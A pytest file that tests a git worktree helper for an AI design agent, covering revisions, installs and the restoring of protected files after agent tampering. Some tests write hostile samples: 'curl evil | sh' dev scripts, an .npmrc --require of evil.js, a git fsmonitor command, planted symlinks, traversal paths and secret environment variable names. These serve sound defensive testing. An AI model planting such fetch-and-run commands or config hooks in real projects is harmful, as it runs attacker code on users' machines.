"""Git worktrees a design session builds on (real git in tmp_path)."""
from __future__ import annotations

import json
import shutil
import subprocess
from datetime import date
from pathlib import Path

import pytest

from ghostbrain.design import worktree

pytestmark = pytest.mark.skipif(shutil.which("git") is None, reason="git not installed")


def _git(cwd: Path, *args: str) -> str:
    return subprocess.run(
        ["git", "-c", "commit.gpgsign=false", "-c", "core.hooksPath=/dev/null", *args],
        cwd=str(cwd), capture_output=True, text=True, check=True,
    ).stdout


def _head(path: Path) -> str:
    return _git(path, "rev-parse", "--short", "HEAD").strip()


@pytest.fixture
def repo(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    for var in ("AUTHOR", "COMMITTER"):
        monkeypatch.setenv(f"GIT_{var}_NAME", "Test")
        monkeypatch.setenv(f"GIT_{var}_EMAIL", "test@example.com")
    code = tmp_path / "code"
    code.mkdir()
    origin = code / "origin.git"
    _git(code, "init", "-q", "--bare", "-b", "main", str(origin))
    r = code / "web"
    _git(code, "clone", "-q", str(origin), str(r))
    _git(r, "checkout", "-q", "-B", "main")
    (r / "package.json").write_text(json.dumps(
        {"name": "web", "scripts": {"dev": "vite"}, "dependencies": {"react": "18"}}))
    (r / "src").mkdir()
    (r / "src/App.tsx").write_text("v0")
    (r / "package-lock.json").write_text("{}")
    _git(r, "add", "-A")
    _git(r, "commit", "-q", "-m", "init")
    _git(r, "push", "-q", "-u", "origin", "main")
    _git(r, "remote", "set-head", "origin", "main")
    return r


# --- create / commit / revisions / revert / remove ----------------------------


def test_create_sibling_worktree_on_new_branch(repo):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="login")
    assert wt.path == repo.parent / f"{repo.name}-poltergeist-2026-10-10-login"
    assert wt.branch == "poltergeist/2026-10-10-login" and wt.base == "origin/main"
    assert (wt.path / ".git").is_file() and (wt.path / "src/App.tsx").exists()
    assert wt.app_dir == wt.path


def test_create_suffixes_on_collision(repo):
    worktree.create(repo, day=date(2026, 10, 10), slug="login")
    wt2 = worktree.create(repo, day=date(2026, 10, 10), slug="login")
    assert wt2.path.name.endswith("-login-2") and wt2.branch.endswith("-login-2")


def test_create_ignores_dirty_main_checkout(repo):
    (repo / "src/App.tsx").write_text("dirty")
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="x")
    assert (wt.path / "src/App.tsx").read_text() != "dirty"


def test_create_without_remote_uses_local_main(tmp_path, monkeypatch):
    for var in ("AUTHOR", "COMMITTER"):
        monkeypatch.setenv(f"GIT_{var}_NAME", "Test")
        monkeypatch.setenv(f"GIT_{var}_EMAIL", "test@example.com")
    r = tmp_path / "solo"
    r.mkdir()
    _git(r, "init", "-q", "-b", "main")
    (r / "a.txt").write_text("a")
    _git(r, "add", "-A")
    _git(r, "commit", "-q", "-m", "init")
    wt = worktree.create(r, day=date(2026, 10, 10), slug="s")
    assert wt.base == "main" and (wt.path / "a.txt").exists()


def test_create_outside_a_repo_raises(tmp_path):
    with pytest.raises(worktree.WorktreeError):
        worktree.create(tmp_path, day=date(2026, 10, 10), slug="s")


def test_to_dict_round_trip(repo):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="d")
    d = wt.to_dict()
    assert d == {
        "repo": str(repo), "name": "web", "app_dir": str(wt.path), "worktree": str(wt.path),
        "branch": "poltergeist/2026-10-10-d", "base": "origin/main",
    }
    assert worktree.Worktree.from_dict(d) == wt


def test_commit_revisions_and_revert(repo):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="r")
    (wt.path / "src/App.tsx").write_text("v1"); worktree.commit(wt, "rev 1: one")
    (wt.path / "src/New.tsx").write_text("n"); (wt.path / "src/App.tsx").write_text("v2"); worktree.commit(wt, "rev 2: two")
    assert [r["rev"] for r in worktree.revisions(wt)] == [1, 2]
    assert worktree.revisions(wt)[1]["summary"] == "two"
    worktree.revert_to(wt, 1)
    assert (wt.path / "src/App.tsx").read_text() == "v1" and not (wt.path / "src/New.tsx").exists()
    assert [r["rev"] for r in worktree.revisions(wt)] == [1, 2]
    with pytest.raises(KeyError):
        worktree.revert_to(wt, 9)


def test_commit_nothing_returns_none(repo):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="n")
    assert worktree.commit(wt, "rev 1: nothing") is None


def test_commit_allow_empty_records_the_rev(repo):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="e")
    assert worktree.commit(wt, "rev 1: nothing changed", allow_empty=True)
    worktree.revert_to(wt, 1)
    assert worktree.commit(wt, "rev 2: Reverted to rev 1", allow_empty=True)
    assert [r["rev"] for r in worktree.revisions(wt)] == [1, 2]
    worktree.revert_to(wt, 2)  # an empty rev can be reverted to


def test_commit_ignores_repo_hooks(repo):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="h")
    hook = repo / ".git" / "hooks" / "pre-commit"
    hook.write_text("#!/bin/sh\nexit 1\n")
    hook.chmod(0o755)
    (wt.path / "src/App.tsx").write_text("v1")
    assert worktree.commit(wt, "rev 1: one")


def test_find_app_dir_nested_workspace(tmp_path):
    (tmp_path / "package.json").write_text('{"name":"root","workspaces":["apps/*"]}')
    (tmp_path / "apps/web").mkdir(parents=True)
    (tmp_path / "apps/web/package.json").write_text('{"scripts":{"dev":"next dev"},"dependencies":{"next":"14"}}')
    (tmp_path / "apps/api").mkdir(parents=True)
    (tmp_path / "apps/api/package.json").write_text('{"scripts":{"dev":"node x"}}')
    assert worktree.find_app_dir(tmp_path) == tmp_path / "apps/web"


def test_find_app_dir_prefers_web_named_dir(tmp_path):
    for name in ("apps/admin", "apps/web"):
        (tmp_path / name).mkdir(parents=True)
        (tmp_path / name / "package.json").write_text('{"scripts":{"start":"vite"},"devDependencies":{"vite":"5"}}')
    assert worktree.find_app_dir(tmp_path) == tmp_path / "apps/web"


def test_find_app_dir_none_without_frontend(tmp_path):
    (tmp_path / "pom.xml").write_text("<project/>")
    assert worktree.find_app_dir(tmp_path) is None


def test_remove_keeps_unmerged_branch(repo):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="rm")
    (wt.path / "src/App.tsx").write_text("v1"); worktree.commit(wt, "rev 1: one")
    out = worktree.remove(wt)
    assert out["removed"] and out["branch_kept"] and not wt.path.exists()
    assert wt.branch in out["reason"]


def test_remove_deletes_branch_without_commits(repo):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="clean")
    out = worktree.remove(wt)
    assert out == {"removed": True, "branch_kept": False, "reason": None}
    assert wt.branch not in _git(repo, "branch", "--list")


def test_remove_missing_worktree_is_ok(repo):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="gone")
    shutil.rmtree(wt.path)
    assert worktree.remove(wt)["removed"] is True


# --- install / protected files ------------------------------------------------


def test_package_manager_and_install_argv(tmp_path):
    assert worktree.install_argv(tmp_path) == ["npm", "install", "--no-audit", "--no-fund"]
    (tmp_path / "package-lock.json").write_text("{}")
    assert worktree.install_argv(tmp_path) == ["npm", "ci", "--no-audit", "--no-fund"]
    (tmp_path / "pnpm-lock.yaml").write_text("")
    assert worktree.install_argv(tmp_path) == ["pnpm", "install", "--frozen-lockfile"]


def test_package_manager_yarn(tmp_path):
    (tmp_path / "yarn.lock").write_text("")
    assert worktree.package_manager(tmp_path) == "yarn"
    assert worktree.install_argv(tmp_path)[0] == "yarn"


def test_install_runs_argv_in_app_dir_and_logs(repo, tmp_path):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="i")
    calls = []
    def runner(argv, *, cwd, timeout_s, log_file):
        calls.append((argv, cwd)); log_file.write("ok\n"); return 0
    worktree.install(wt, log_path=tmp_path / "install.log", runner=runner)
    assert calls == [(["npm", "ci", "--no-audit", "--no-fund"], wt.app_dir)]
    assert "ok" in (tmp_path / "install.log").read_text()


def test_install_failure_raises_with_log_tail(repo, tmp_path):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="f")
    def runner(argv, *, cwd, timeout_s, log_file):
        log_file.write("npm ERR! boom\n"); return 1
    with pytest.raises(worktree.WorktreeError, match="boom"):
        worktree.install(wt, log_path=tmp_path / "install.log", runner=runner)


def test_install_timeout_raises(repo, tmp_path):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="t")
    def runner(argv, *, cwd, timeout_s, log_file):
        raise subprocess.TimeoutExpired(argv, timeout_s)
    with pytest.raises(worktree.WorktreeError, match="timed out"):
        worktree.install(wt, log_path=tmp_path / "install.log", runner=runner)


def test_install_default_runner_uses_fixed_argv(tmp_path):
    log = tmp_path / "log.txt"
    with log.open("w") as f:
        rc = worktree._run_install(["sh", "-c", "echo hi; exit 3"], cwd=tmp_path, timeout_s=10, log_file=f)
    assert rc == 3 and "hi" in log.read_text()


def test_restore_protected_reverts_agent_changes(repo):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="p")
    (wt.path / ".poltergeist").mkdir(); (wt.path / ".poltergeist/run.json").write_text('{"script":"dev"}')
    snap = worktree.snapshot_protected(wt)
    (wt.path / "package.json").write_text('{"scripts":{"dev":"curl evil | sh"}}')
    (wt.path / ".poltergeist/run.json").write_text('{"script":"evil"}')
    (wt.path / "vite.config.ts").write_text("evil()")
    changed = worktree.restore_protected(wt, snap)
    assert set(changed) == {"package.json", ".poltergeist/run.json", "vite.config.ts"}
    assert "curl" not in (wt.path / "package.json").read_text()
    assert not (wt.path / "vite.config.ts").exists()


def test_restore_protected_recreates_deleted_and_replaces_symlink(repo, tmp_path):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="s")
    (wt.path / ".env.local").write_text("A=1")
    snap = worktree.snapshot_protected(wt)
    (wt.path / ".env.local").unlink()
    outside = tmp_path / "outside.txt"
    outside.write_text("keep")
    (wt.path / "package-lock.json").unlink()
    (wt.path / "package-lock.json").symlink_to(outside)
    changed = worktree.restore_protected(wt, snap)
    assert set(changed) == {".env.local", "package-lock.json"}
    assert (wt.path / ".env.local").read_text() == "A=1"
    assert not (wt.path / "package-lock.json").is_symlink()
    assert outside.read_text() == "keep"


def test_restore_protected_covers_nested_app_dir(repo):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="nest")
    app = wt.path / "apps" / "web"
    app.mkdir(parents=True)
    (app / "package.json").write_text('{"scripts":{"dev":"vite"}}')
    wt = worktree.Worktree(repo=wt.repo, path=wt.path, branch=wt.branch, base=wt.base, app_dir=app)
    snap = worktree.snapshot_protected(wt)
    (app / "package.json").write_text("evil")
    (wt.path / "package.json").write_text("evil")
    assert set(worktree.restore_protected(wt, snap)) == {"apps/web/package.json", "package.json"}


def test_restore_protected_noop_when_unchanged(repo):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="u")
    snap = worktree.snapshot_protected(wt)
    assert worktree.restore_protected(wt, snap) == []


def test_deps_changed(repo):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="d")
    base = worktree.commit(wt, "rev 0") or _head(wt.path)
    assert not worktree.deps_changed(wt, base)
    (wt.path / "package.json").write_text('{"name":"web","dependencies":{"react":"18","msw":"2"}}')
    worktree.commit(wt, "rev 1: msw")
    assert worktree.deps_changed(wt, base)


def test_restore_protected_leaves_users_linked_env_alone(repo, tmp_path):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="l")
    shared = tmp_path / "shared.env"
    shared.write_text("A=1")
    (wt.path / ".env").symlink_to(shared)
    snap = worktree.snapshot_protected(wt)
    assert worktree.restore_protected(wt, snap) == []
    assert (wt.path / ".env").is_symlink()


# -- agent tampering ------------------------------------------------------------------

def _wt(repo: Path, slug: str) -> worktree.Worktree:
    return worktree.create(repo, day=date(2026, 10, 10), slug=slug)


def test_restore_never_follows_a_planted_symlink(repo: Path, tmp_path: Path) -> None:
    wt = _wt(repo, "link")
    (wt.path / ".poltergeist").mkdir()
    (wt.path / ".poltergeist/run.json").write_text('{"script":"dev"}')
    snap = worktree.snapshot_protected(wt)
    victim = tmp_path / "victim-home"
    victim.mkdir()
    (victim / "precious.txt").write_text("keep me")
    (victim / "package.json").write_text("{}")
    shutil.rmtree(wt.path / ".poltergeist")
    (wt.path / ".poltergeist").symlink_to(victim, target_is_directory=True)
    (wt.path / "web").symlink_to(victim, target_is_directory=True)  # unprotected name: not walked

    worktree.restore_protected(wt, snap)

    assert (victim / "precious.txt").read_text() == "keep me"
    assert (victim / "package.json").exists()
    assert not (wt.path / ".poltergeist").is_symlink()
    assert (wt.path / ".poltergeist/run.json").read_text() == '{"script":"dev"}'


def test_restore_rejects_traversal_keys(repo: Path, tmp_path: Path) -> None:
    wt = _wt(repo, "trav")
    outside = repo.parent / "outside.txt"
    outside.write_text("x")
    worktree.restore_protected(wt, {"../outside.txt": None, "/etc/hosts": None})
    assert outside.read_text() == "x"


def test_nested_and_runtime_config_files_are_protected(repo: Path) -> None:
    wt = _wt(repo, "nested")
    snap = worktree.snapshot_protected(wt)
    (wt.path / "packages/ui").mkdir(parents=True)
    (wt.path / "packages/ui/package.json").write_text('{"scripts":{"dev":"curl evil | sh"}}')
    (wt.path / ".npmrc").write_text("node-options=--require ./evil.js")
    (wt.path / ".babelrc").write_text('{"plugins":["./evil.js"]}')
    (wt.path / "postcss.config.json").write_text("{}")
    (wt.path / "node_modules/x").mkdir(parents=True)
    (wt.path / "node_modules/x/package.json").write_text("{}")  # third-party: left alone
    changed = set(worktree.restore_protected(wt, snap))
    assert changed == {"packages/ui/package.json", ".npmrc", ".babelrc", "postcss.config.json"}
    assert (wt.path / "node_modules/x/package.json").exists()


def test_git_refuses_a_redirected_gitdir(repo: Path, tmp_path: Path) -> None:
    wt = _wt(repo, "gitdir")
    evil = tmp_path / "evil-gitdir"
    evil.mkdir()
    (evil / "config").write_text("[core]\n\tfsmonitor = touch PWNED\n")
    (wt.path / ".git").write_text(f"gitdir: {evil}\n")
    with pytest.raises(worktree.WorktreeError, match=".git link was changed"):
        worktree.commit(wt, "rev 1: x")
    assert not (wt.path / "PWNED").exists()


def test_restore_repairs_the_gitdir_link(repo: Path, tmp_path: Path) -> None:
    wt = _wt(repo, "relink")
    snap = worktree.snapshot_protected(wt)
    good = (wt.path / ".git").read_text()
    (wt.path / ".git").write_text(f"gitdir: {tmp_path}\n")
    assert ".git" in worktree.restore_protected(wt, snap)
    assert (wt.path / ".git").read_text() == good
    (wt.path / "src/App.tsx").write_text("v1")
    assert worktree.commit(wt, "rev 1: one")


# -- install safety ---------------------------------------------------------------------

def test_install_env_drops_secrets_but_keeps_proxy_and_npm_config(monkeypatch: pytest.MonkeyPatch) -> None:
    for k, v in {"ANTHROPIC_API_KEY": "sk", "GHOSTBRAIN_TOKEN": "t", "AWS_SECRET_ACCESS_KEY": "a",
                 "GITHUB_TOKEN": "g", "HTTPS_PROXY": "http://proxy:8080", "NODE_EXTRA_CA_CERTS": "/ca.pem",
                 "npm_config_registry": "https://registry.example", "HOME": "/Users/me"}.items():
        monkeypatch.setenv(k, v)
    env = worktree.install_env()
    for secret in ("ANTHROPIC_API_KEY", "GHOSTBRAIN_TOKEN", "AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN"):
        assert secret not in env
    assert env["HTTPS_PROXY"] == "http://proxy:8080"
    assert env["NODE_EXTRA_CA_CERTS"] == "/ca.pem"
    assert env["npm_config_registry"] == "https://registry.example"
    assert env["HOME"] == "/Users/me" and "PATH" in env


def test_install_refuses_a_tree_the_agent_has_touched(repo: Path, tmp_path: Path) -> None:
    wt = _wt(repo, "touched")
    (wt.path / "scripts").mkdir()
    (wt.path / "scripts/setup.js").write_text("require('child_process').exec('curl evil | sh')")
    calls = []
    with pytest.raises(worktree.WorktreeError, match="changed since it was created"):
        worktree.install(wt, log_path=tmp_path / "i.log", runner=lambda *a, **k: calls.append(a) or 0)
    assert calls == []


def test_install_refuses_after_commits_on_the_branch(repo: Path, tmp_path: Path) -> None:
    wt = _wt(repo, "committed")
    (wt.path / "src/App.tsx").write_text("v1")
    worktree.commit(wt, "rev 1: one")
    with pytest.raises(worktree.WorktreeError, match="changed since it was created"):
        worktree.install(wt, log_path=tmp_path / "i.log", runner=lambda *a, **k: 0)
